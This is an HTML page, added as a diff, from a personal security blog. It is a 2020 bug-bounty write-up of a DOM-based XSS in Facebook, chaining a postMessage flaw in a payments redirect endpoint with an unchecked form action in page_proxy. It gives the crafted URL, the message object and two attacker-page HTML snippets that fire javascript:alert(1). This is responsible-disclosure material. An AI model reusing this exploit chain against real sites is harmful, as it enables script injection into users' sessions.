@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Facebook DOM Based XSS using postMessage | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Facebook DOM Based XSS using postMessage" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="The first bug could have allowed a malicious user to send cross-origin messages via postMessage method from facebook.com domain. The vulnerable endpoint would accept user controlled content in the request parameters and construct an object with the data supplied to be send with postMessage to opener window. Then, another bug was found and then linked with the previous, this bug was that a script was unsafely constructing and submitting a form based on the data received in messages via an Eventlistener. 1) Sending messages via postMessage from facebook.com originThe vulnerable endpoint was https://www.facebook.com/payments/redirect.php . The response of this endpoint could be controlled by many parameters. I found an interesting one which is &quot;type&quot;. This parameter if changed from normally &quot;i&quot; to &quot;rp&quot; it would use postMessage for communication with the opener window ( for &quot;i&quot; it would use window.parent.PaymentsFlows.processIFrame). Attacker controls what being sent with postMessage method. Notice that the target origin was set to our.intern.facebook.com. From this i knew that the postMessage method was there to target or only be used by Facebook employees since our.intern.facebook.com domain is only &quot;fully&quot; accessible to them and for no-employees, it would redirect to www.facebook.com.I tried to bypass this for future usage by accessing the same endpoint in another domain which is our.alpha.facebook.com. In case of our.alpha.facebook.com/payments/redirect.php, it would return our.alpha.facebook.com as the targetOrigin of the postMessage. In the contrary of&nbsp;our.intern , our.alpha would not redirect to www. Notice that our.alpha.facebook.com domain has the same content as www.facebook.com. This would allow messages to opener window to pass-through since the targetOrigin condition would be fulfilled and messages would be sent to our.alpha.facebook.com. At this point, i knew that i should exploit this by looking for pages where interesting message EventListeners exists and which would only accept facebook.com subdomains in the message origin. Only accepting Facebook domains is a big hint that the data received in the message would be used to do something serious. I found a couple of interesting ones but i&#39;ll only mention the one that got me DOM XSS. 2) The XSS Facebook Canvas Apps are served under apps.facebook.com. If you visit an app being served there, you&#39;ll notice that Facebook would load an URL ( previously selected by the app owner ) inside an iframe and then a POST message would be sent to this URL with parameters like &quot;signed_request&quot;. Tracing what originated this request, i found that the page was loading &quot;https://www.facebook.com/platform/page_proxy/?version=X&quot; in an iframe too and then sending messages to it with postMessage ( I later found out that this endpoint was used before by another researcher to achieve a serious bug too).The page_proxy page contained this code: page_proxy source code This code would do two things. It would send a message with frameName via postMessage to any origin (This was used by Amol but now fixed by checking the frameName). The second thing is it would setup an EventListener and wait for messages. If a message is received and all conditions are fulfilled, it would submit a form after setting its attributes based on the data inside the message.What&#39;s interesting about the form construction (submitForm method), is that the action attribute of the form is directly set to &quot;a.data.params.appTabUrl&quot; which is received in the message. The URL inside &quot;appTabUrl&quot; string wasn&#39;t checked if it starts with http/https, for that we can use other schemes like javascript to achieve XSS! A payload that would construct an object that would fulfill all conditions in the page_proxy script would be something like this:https://our.alpha.facebook.com/payments/redirect.php?type=rp&amp;name=_self&amp;params[appTabUrl]=javascript:alert(1);&amp;params[signedRequest]=SIGNED_X&amp;platformAppControllerGetFrameParamsResponse=1OBJ: {&quot;type&quot;:&quot;rp&quot;,&quot;name&quot;:&quot;_self&quot;,&quot;params&quot;:{&quot;appTabUrl&quot;:&quot;javascript:alert(1);&quot;,&quot;signedRequest&quot;:&quot;SIGNED_X&quot;},&quot;platformAppControllerGetFrameParamsResponse&quot;:&quot;1&quot;} Exploit The victim should visit the attacker website which would have the following code. This would open another page in the attacker website and the current window would be the opener window. Start Attack Here we won&#39;t redirect directly to page_proxy endpoint since we need to set a timeout to ensure that https://www.facebook.com/platform/page_proxy/ was loaded.page2.html:" />
+<meta property="og:description" content="The first bug could have allowed a malicious user to send cross-origin messages via postMessage method from facebook.com domain. The vulnerable endpoint would accept user controlled content in the request parameters and construct an object with the data supplied to be send with postMessage to opener window. Then, another bug was found and then linked with the previous, this bug was that a script was unsafely constructing and submitting a form based on the data received in messages via an Eventlistener. 1) Sending messages via postMessage from facebook.com originThe vulnerable endpoint was https://www.facebook.com/payments/redirect.php . The response of this endpoint could be controlled by many parameters. I found an interesting one which is &quot;type&quot;. This parameter if changed from normally &quot;i&quot; to &quot;rp&quot; it would use postMessage for communication with the opener window ( for &quot;i&quot; it would use window.parent.PaymentsFlows.processIFrame). Attacker controls what being sent with postMessage method. Notice that the target origin was set to our.intern.facebook.com. From this i knew that the postMessage method was there to target or only be used by Facebook employees since our.intern.facebook.com domain is only &quot;fully&quot; accessible to them and for no-employees, it would redirect to www.facebook.com.I tried to bypass this for future usage by accessing the same endpoint in another domain which is our.alpha.facebook.com. In case of our.alpha.facebook.com/payments/redirect.php, it would return our.alpha.facebook.com as the targetOrigin of the postMessage. In the contrary of&nbsp;our.intern , our.alpha would not redirect to www. Notice that our.alpha.facebook.com domain has the same content as www.facebook.com. This would allow messages to opener window to pass-through since the targetOrigin condition would be fulfilled and messages would be sent to our.alpha.facebook.com. At this point, i knew that i should exploit this by looking for pages where interesting message EventListeners exists and which would only accept facebook.com subdomains in the message origin. Only accepting Facebook domains is a big hint that the data received in the message would be used to do something serious. I found a couple of interesting ones but i&#39;ll only mention the one that got me DOM XSS. 2) The XSS Facebook Canvas Apps are served under apps.facebook.com. If you visit an app being served there, you&#39;ll notice that Facebook would load an URL ( previously selected by the app owner ) inside an iframe and then a POST message would be sent to this URL with parameters like &quot;signed_request&quot;. Tracing what originated this request, i found that the page was loading &quot;https://www.facebook.com/platform/page_proxy/?version=X&quot; in an iframe too and then sending messages to it with postMessage ( I later found out that this endpoint was used before by another researcher to achieve a serious bug too).The page_proxy page contained this code: page_proxy source code This code would do two things. It would send a message with frameName via postMessage to any origin (This was used by Amol but now fixed by checking the frameName). The second thing is it would setup an EventListener and wait for messages. If a message is received and all conditions are fulfilled, it would submit a form after setting its attributes based on the data inside the message.What&#39;s interesting about the form construction (submitForm method), is that the action attribute of the form is directly set to &quot;a.data.params.appTabUrl&quot; which is received in the message. The URL inside &quot;appTabUrl&quot; string wasn&#39;t checked if it starts with http/https, for that we can use other schemes like javascript to achieve XSS! A payload that would construct an object that would fulfill all conditions in the page_proxy script would be something like this:https://our.alpha.facebook.com/payments/redirect.php?type=rp&amp;name=_self&amp;params[appTabUrl]=javascript:alert(1);&amp;params[signedRequest]=SIGNED_X&amp;platformAppControllerGetFrameParamsResponse=1OBJ: {&quot;type&quot;:&quot;rp&quot;,&quot;name&quot;:&quot;_self&quot;,&quot;params&quot;:{&quot;appTabUrl&quot;:&quot;javascript:alert(1);&quot;,&quot;signedRequest&quot;:&quot;SIGNED_X&quot;},&quot;platformAppControllerGetFrameParamsResponse&quot;:&quot;1&quot;} Exploit The victim should visit the attacker website which would have the following code. This would open another page in the attacker website and the current window would be the opener window. Start Attack Here we won&#39;t redirect directly to page_proxy endpoint since we need to set a timeout to ensure that https://www.facebook.com/platform/page_proxy/ was loaded.page2.html:" />
+<link rel="canonical" href="http://localhost:4000/uncategorized/2020/11/07/facebook-dom-based-xss-using-postmessage.html" />
+<meta property="og:url" content="http://localhost:4000/uncategorized/2020/11/07/facebook-dom-based-xss-using-postmessage.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-11-07T20:01:08+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Facebook DOM Based XSS using postMessage" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-11-07T20:01:08+01:00","datePublished":"2020-11-07T20:01:08+01:00","description":"The first bug could have allowed a malicious user to send cross-origin messages via postMessage method from facebook.com domain. The vulnerable endpoint would accept user controlled content in the request parameters and construct an object with the data supplied to be send with postMessage to opener window. Then, another bug was found and then linked with the previous, this bug was that a script was unsafely constructing and submitting a form based on the data received in messages via an Eventlistener. 1) Sending messages via postMessage from facebook.com originThe vulnerable endpoint was https://www.facebook.com/payments/redirect.php . The response of this endpoint could be controlled by many parameters. I found an interesting one which is &quot;type&quot;. This parameter if changed from normally &quot;i&quot; to &quot;rp&quot; it would use postMessage for communication with the opener window ( for &quot;i&quot; it would use window.parent.PaymentsFlows.processIFrame). Attacker controls what being sent with postMessage method. Notice that the target origin was set to our.intern.facebook.com. From this i knew that the postMessage method was there to target or only be used by Facebook employees since our.intern.facebook.com domain is only &quot;fully&quot; accessible to them and for no-employees, it would redirect to www.facebook.com.I tried to bypass this for future usage by accessing the same endpoint in another domain which is our.alpha.facebook.com. In case of our.alpha.facebook.com/payments/redirect.php, it would return our.alpha.facebook.com as the targetOrigin of the postMessage. In the contrary of&nbsp;our.intern , our.alpha would not redirect to www. Notice that our.alpha.facebook.com domain has the same content as www.facebook.com. This would allow messages to opener window to pass-through since the targetOrigin condition would be fulfilled and messages would be sent to our.alpha.facebook.com. At this point, i knew that i should exploit this by looking for pages where interesting message EventListeners exists and which would only accept facebook.com subdomains in the message origin. Only accepting Facebook domains is a big hint that the data received in the message would be used to do something serious. I found a couple of interesting ones but i&#39;ll only mention the one that got me DOM XSS. 2) The XSS Facebook Canvas Apps are served under apps.facebook.com. If you visit an app being served there, you&#39;ll notice that Facebook would load an URL ( previously selected by the app owner ) inside an iframe and then a POST message would be sent to this URL with parameters like &quot;signed_request&quot;. Tracing what originated this request, i found that the page was loading &quot;https://www.facebook.com/platform/page_proxy/?version=X&quot; in an iframe too and then sending messages to it with postMessage ( I later found out that this endpoint was used before by another researcher to achieve a serious bug too).The page_proxy page contained this code: page_proxy source code This code would do two things. It would send a message with frameName via postMessage to any origin (This was used by Amol but now fixed by checking the frameName). The second thing is it would setup an EventListener and wait for messages. If a message is received and all conditions are fulfilled, it would submit a form after setting its attributes based on the data inside the message.What&#39;s interesting about the form construction (submitForm method), is that the action attribute of the form is directly set to &quot;a.data.params.appTabUrl&quot; which is received in the message. The URL inside &quot;appTabUrl&quot; string wasn&#39;t checked if it starts with http/https, for that we can use other schemes like javascript to achieve XSS! A payload that would construct an object that would fulfill all conditions in the page_proxy script would be something like this:https://our.alpha.facebook.com/payments/redirect.php?type=rp&amp;name=_self&amp;params[appTabUrl]=javascript:alert(1);&amp;params[signedRequest]=SIGNED_X&amp;platformAppControllerGetFrameParamsResponse=1OBJ: {&quot;type&quot;:&quot;rp&quot;,&quot;name&quot;:&quot;_self&quot;,&quot;params&quot;:{&quot;appTabUrl&quot;:&quot;javascript:alert(1);&quot;,&quot;signedRequest&quot;:&quot;SIGNED_X&quot;},&quot;platformAppControllerGetFrameParamsResponse&quot;:&quot;1&quot;} Exploit The victim should visit the attacker website which would have the following code. This would open another page in the attacker website and the current window would be the opener window. Start Attack Here we won&#39;t redirect directly to page_proxy endpoint since we need to set a timeout to ensure that https://www.facebook.com/platform/page_proxy/ was loaded.page2.html:","headline":"Facebook DOM Based XSS using postMessage","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/uncategorized/2020/11/07/facebook-dom-based-xss-using-postmessage.html"},"url":"http://localhost:4000/uncategorized/2020/11/07/facebook-dom-based-xss-using-postmessage.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Facebook DOM Based XSS using postMessage</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2020-11-07T20:01:08+01:00" itemprop="datePublished">Nov 7, 2020
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><!-- wp:paragraph --></p>
+<p>The first bug could have allowed a malicious user to send cross-origin messages  via postMessage method from facebook.com domain. The vulnerable endpoint would accept user controlled content in the request parameters  and construct an object with the data supplied to be send with postMessage to opener window. Then, another bug was found and then linked with the previous, this bug was that a script was  unsafely constructing and submitting a form based on the data received in messages via an Eventlistener.</p>
+<p><!--more--><br />
+<!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>1) Sending messages via postMessage from facebook.com origin</strong><br><br>The vulnerable endpoint was <strong>https://www.facebook.com/payments/redirect.php</strong> . The response of this endpoint could be controlled by many parameters. I found an interesting one which is "type". This parameter if changed from normally "i" to "rp" it would use postMessage for communication with the opener window ( for "i" it would use window.parent.PaymentsFlows.processIFrame).</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":494,"sizeSlug":"large"} --></p>
+<figure class="wp-block-image size-large"><img src="https://ysamm.com/assets/uploads/2020/11/P1-1024x97.png" alt="" class="wp-image-494"/><br />
+<figcaption>Attacker controls what being sent with postMessage method.</figcaption>
+</figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p> Notice that the target origin was set to <strong>our.intern.facebook.com</strong>. From this i knew that the postMessage method was there to target or only be used by Facebook employees since <strong>our.intern.facebook.com</strong> domain is only "fully" accessible to them and for no-employees, it would redirect to <strong>www.facebook.com</strong>.<br>I tried to bypass this for future usage by accessing the same endpoint in another domain which is <strong>our.alpha.facebook.com</strong>. In case of our.alpha.facebook.com/payments/redirect.php, it would return <strong>our.alpha.facebook.com</strong> as the targetOrigin of the postMessage. In the contrary of&nbsp;<strong>our.intern</strong> , <strong>our.alpha</strong> would not redirect to <strong>www</strong>. Notice that our.alpha.facebook.com domain has the same content as www.facebook.com. <br>This would allow messages to opener window to pass-through since the targetOrigin condition would be fulfilled and messages would be sent to our.alpha.facebook.com.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>At this point, i knew that i should exploit this by looking for pages where interesting message EventListeners exists and which would only accept facebook.com subdomains in the message origin. Only accepting Facebook domains is a big hint that the data received in the message would be used to do something serious. I found a couple of interesting ones but i'll only mention the one that got me DOM XSS.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>2) The XSS </strong><br><br>Facebook Canvas Apps are served under apps.facebook.com. If you visit an app being served there, you'll notice that Facebook would load an URL ( previously selected by the app owner ) inside an iframe and then a POST message would be sent to this URL with parameters like "signed_request". <br>Tracing what originated this request, i found that the page was loading "https://www.facebook.com/platform/page_proxy/?version=X" in an iframe too and then sending messages to it with postMessage ( I later found out that this endpoint was used before by another researcher to achieve a <a href="https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/" data-type="URL" data-id="https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/">serious bug</a> too).<br>The page_proxy page contained this code:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"id":499,"sizeSlug":"large"} --></p>
+<figure class="wp-block-image size-large"><img src="https://ysamm.com/assets/uploads/2020/11/proxy-1024x549.png" alt="" class="wp-image-499"/><br />
+<figcaption>page_proxy source code</figcaption>
+</figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>This code would do two things. It would send a message with frameName via postMessage to any origin (This was used by Amol but now fixed by checking the frameName). The second thing is it would setup an EventListener and wait for messages. If a message is received and all conditions are fulfilled, it would submit a form after setting its attributes based on the data inside the message.<br>What's interesting about the form construction (submitForm method), is that the action attribute of the form is directly set to "a.data.params.appTabUrl" which is received in the message. The URL inside "appTabUrl" string wasn't checked if it starts with http/https, for that we can use other schemes like javascript to achieve XSS!   </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>A payload that would construct an object that would fulfill all conditions in the page_proxy script would be something like this:<br><br><strong>https://our.alpha.facebook.com/payments/redirect.php?type=rp&amp;name=_self&amp;params[appTabUrl]=javascript:alert(1);&amp;params[signedRequest]=SIGNED_X&amp;platformAppControllerGetFrameParamsResponse=1</strong><br><br>OBJ: {"type":"rp","name":"_self","params":{"appTabUrl":"javascript:alert(1);","signedRequest":"SIGNED_X"},"platformAppControllerGetFrameParamsResponse":"1"}</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Exploit</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>The victim should visit the attacker website which would have the following code. This would open another page in the attacker website and the current window would be the opener window.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code><html>
+<button class="button" onClick="window.open('https://attacker/page2.html', '_blank');document.location.href = 'https://our.alpha.facebook.com/platform/page_proxy/?version=X#_self';">
+<span class="icon">Start Attack</span>
+</button>
+</html></code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Here we won't redirect directly to page_proxy endpoint since we need to set a timeout to ensure that https://www.facebook.com/platform/page_proxy/ was loaded.<br><br>page2.html:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code><html>
+<script>
+setTimeout(function(){ window.location.href = 'https://our.alpha.facebook.com/payments/redirect.php?type=rp&amp;merchant_group=86&amp;name=_self&amp;params&#91;appTabUrl]=javascript:alert(1);&amp;params&#91;signedRequest]=SIGNED_X&amp;platformAppControllerGetFrameParamsResponse=1';} ,3000);
+</script>
+</html></code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+
+  </div><a class="u-url" href="/uncategorized/2020/11/07/facebook-dom-based-xss-using-postmessage.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
